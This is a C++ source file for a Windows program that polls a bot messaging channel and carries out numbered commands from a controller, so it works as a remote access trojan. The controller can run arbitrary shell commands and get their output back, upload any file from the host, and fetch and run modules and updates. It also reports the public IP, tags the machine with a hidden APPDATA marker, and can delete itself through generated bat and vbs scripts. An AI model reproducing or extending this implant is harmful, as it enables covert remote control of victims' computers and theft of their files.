//
// Created by crazy on 07.12.2021.
//

#include "../include/App.h"
#include <sys/stat.h>
#include <utility>
#include <cstdlib>
#include <ctime>

App::App(bot::Bot &bot) : m_bot(bot) {
    logInfo("APPLICATION INITIALIZED");
}

void App::run() {
    int mark = getSystemMark();

    m_bot.login(mark);

    if (m_bot.getSystemId() != mark) {
        logInfo("REPLACING TOKEN");
        replaceBot();
        m_bot.login(mark);
    } else {

    }
    m_bot.sendMessage(m_bot.getParentId(), "Bot<" + m_bot.getName() + "> is activated",
                      "", "", "user", false);


    logInfo("MAINLOOP RAN");
    while (!m_stop) {
        update();
    }
}

void App::handleMessage(bot::Message &msg) {
    logInfo("COMMAND GOT ( " + msg.getCommand() + " )");

    try {
        str buffer;
        json jsonBuffer;

        int command = std::stoi(msg.getCommand());

        str msgContent = msg.getContent();

        json jsonContent;

        try {
            jsonContent = msg.getJsonContent();
        } catch (nlohmann::detail::parse_error &e) {

        }

        switch (command) {
            case GET_VER:
                replyOnCommand(msg, "0.1.3");
                break;

            case GET_IP:
                replyOnCommand(msg, "", getIpConfig());
                break;

            case GET_SELF_LOGS:
                m_bot.sendFile(msg.getSenderId(), logFilepath, "logs.txt",
                               "", "", "", "user", true, msg.getId());
                break;

            case GET_MODULES:
                jsonBuffer.clear();
                if (fs::exists("modules")) {
                    for (auto &file: fs::directory_iterator("modules"))
                        jsonBuffer.push_back(file.path().filename().string());
                }
                replyOnCommand(msg, "JSON", jsonBuffer.dump());
                break;

            case C_STOP:
                m_stop = true;
                logInfo("STOPPING");
                replyOnCommand(msg, "STOPPING");
                break;

            case C_EXEC:
                if (!execWithRussianOut(msgContent.c_str()).empty()) {
                    m_bot.sendFile(msg.getSenderId(), "output", "output",
                                   "", "", "", "user", true, msg.getId());
                } else {
                    replyOnCommand(msg, "EXECUTED");
                }
                break;

            case C_UPDATE:
                if (m_bot.downloadUpdate(jsonContent["name"], jsonContent["version"]) == 200) {
                    replyOnCommand(msg, "UPDATE SUCCESSFULLY DOWNLOADED, START UPDATING");
                    installUpdate(jsonContent);
                } else {
                    replyOnCommand(msg, "STATUS CODE IS NOT 200, UPDATE WAS NOT DOWNLOADED");
                }


                break;

            case C_DOWNLOAD_FILE:
                if (m_bot.saveFile(msg.getFileId(), msg.getFilename()) == 200)
                    replyOnCommand(msg, "FILE DOWNLOADED ( " + msg.getFilename() + " )");
                else
                    replyOnCommand(msg, "STATUS CODE IS NOT 200, FILE WAS NOT DOWNLOADED");
                break;

            case C_DOWNLOAD_MODULE:
                if (m_bot.downloadModule(jsonContent["name"], jsonContent["version"]) == 200)
                    replyOnCommand(msg, "MODULE WAS DOWNLOADED SUCCESSFULLY");
                else
                    replyOnCommand(msg, "STATUS CODE IS NOT 200, MODULE WAS NOT DOWNLOADED");
                break;

            case C_START_MODULE:
                replyOnCommand(msg, startModule(jsonContent["name"], jsonContent["args"]));
                break;

            case C_UPLOAD_FILE:
                m_bot.sendFile(msg.getSenderId(), jsonContent["filepath"], jsonContent["end_filename"],
                               jsonContent["end_filename"], "", "", "user",
                               true, msg.getId());
                break;

            case C_SELF_DESTROY:
                replyOnCommand(msg, "DESTROYING");
                replyOnCommand(msg, "The last message");
                destroySelf();
                break;

            case C_CLEAR_SELF_LOGS:
                clearLog();
                replyOnCommand(msg, "LOGS CLEARED");
                break;

            default:
                break;
        }
    } catch (std::invalid_argument &e) {
        logError("COMMAND HAS WRONG TYPE ( " + msg.getCommand() + " )");
    } catch (nlohmann::detail::parse_error &e) {
        logError("NLOHMANN PARSE ERROR");
    } catch (rq::RequestsException &e) {

    } catch (std::exception &e) {
        logError(e.what());
    }


}

void App::update() {
    Sleep(5000);
    std::vector<bot::Message> msgs = m_bot.getMessages();


    for (auto &msg: msgs) {
        handleMessage(msg);
    }
}

void App::replyOnCommand(bot::Message &msg, str content, str json) {
    str command = msg.getCommand();

    m_bot.sendMessage(msg.getSenderId(), std::move(content), std::move(json), command,
                      "user", true, msg.getId());
}

str App::execWithRussianOut(const char *cmd) { // can't convert rus in json (will be fixed ONCE)
    str msg = "EXEC ( ";
    msg += cmd;
    msg += " )";

    logInfo(msg);

    SetConsoleOutputCP(CP_UTF8);
    setvbuf(stdout, nullptr, _IOFBF, 1000);

    std::array<char, 128> buffer{};
    std::string result;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
    if (!pipe) {
        logError("POPEN FAILED");
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }

    if (!result.empty()) {
        std::ofstream outFile;
        outFile.open("output");
        outFile << result << std::endl;
        outFile.close();
        return "output";
    }

    return "";
}


str App::getIpConfig() {
    rq::Response response = m_requests1.get("https://ifconfig.me/all.json");

    if (response.getStatusCode() == 200)
        return response.getRawContent();
}

void App::installUpdate(json &jsonContent) {
    int res;

    if (jsonContent["data_format"] == "zip") {
        str filePath = "updates/";
        filePath += jsonContent["name"];
        filePath += "/";
        filePath += jsonContent["version"];


        if (jsonContent["pwd"] != nullptr) {
            str pwd = jsonContent["pwd"];
            res = extractZip(filePath, const_cast<char *>(pwd.c_str()));
        } else
            res = extractZip(filePath);

    }

    if (res == 0) {
        if (fs::exists("./EXDIR/start.bat")) {
            logInfo("START UPDATING");
            system("@echo off&cd EXDIR&\"start.bat\"");
            exit(0);
        }

    }
}

int App::extractZip(const str &filePath, char *pwd) {
    if (fs::exists("./EXDIR"))
        system("rd /s /q \"./EXDIR\"");

    mkdir("./EXDIR");

    if (fs::exists(filePath)) {
        str command;
        if (pwd != nullptr)
            command = "7z x " + filePath + " -p" + pwd + " -oEXDIR" + " -y > nul";
        else
            command = "7z x " + filePath + " -oEXDIR" + " -y > nul";

        logInfo("EXTRACTING <" + filePath + "> to EXDIR with command <" + command + ">");

        int res = system(command.c_str());

        return res;
    }
    return 1;
}

void App::destroySelf() {
    std::ofstream batFile;
    batFile.open("../self_destroy.bat");
    batFile << "@echo off \n"
               "chcp 65001\n"
               "rd \"" + fs::current_path().string() + "\" /s /q";
    batFile.close();

    std::ofstream vbsFile;
    vbsFile.open("../self_destroy.vbs");
    vbsFile << "Set oShell = WScript.CreateObject(\"WScript.Shell\")\n"
               "WScript.Sleep 5000\n"
               "oShell.Run chr(34) & \"self_destroy.bat\" & Chr(34), 0\n"
               "Set oShell = Nothing\n";
    vbsFile.close();

//    system("cd .. &start self_destroy.vbs");
    exit(0);

}

str App::startModule(const str &name, const str &args) {
    str command = "call \"modules/" + name + "/" + name + ".exe\" " + args;
    return exec(command.c_str());
}

int App::markSystem() {
    str appdata = getenv("APPDATA");

    if (!fs::exists(appdata + "/.me")) {
        str folderPath = appdata + "/.me";
        mkdir(folderPath.c_str());
    }

    srand((unsigned) time(0));
    int randomNumber = rand();

    std::ofstream infile;
    infile.open(appdata + "/.me/in");
    infile << std::to_string(randomNumber);
    infile.close();
    return randomNumber;
}

int App::getSystemMark() {
    str appdata = getenv("APPDATA");

    if (!fs::exists(appdata + "/.me/in")) {
        return markSystem();
    } else {
        std::ifstream markFile;
        markFile.open(appdata + "/.me/in");
        str mark;
        std::getline(markFile, mark);
        markFile.close();

        return std::stoi(mark);
    }
}

void App::replaceBot() {
    try {
        str token = m_bot.createBot(m_bot.getName() + "_c", true);

        Config config;
        config.setValue("token", token);
        config.save();

        m_bot.setToken(token);
    } catch (std::exception &e) {
        logError("TOKEN REPLACING ERROR");
    }

}

str App::exec(const char *cmd) {
    str msg = "EXEC ( ";
    msg += cmd;
    msg += " )";

    logInfo(msg);

    SetConsoleOutputCP(CP_UTF8);
    setvbuf(stdout, nullptr, _IOFBF, 1000);

    std::array<char, 128> buffer{};
    std::string result;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
    if (!pipe) {
        logError("POPEN FAILED");
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }

    return result;
}





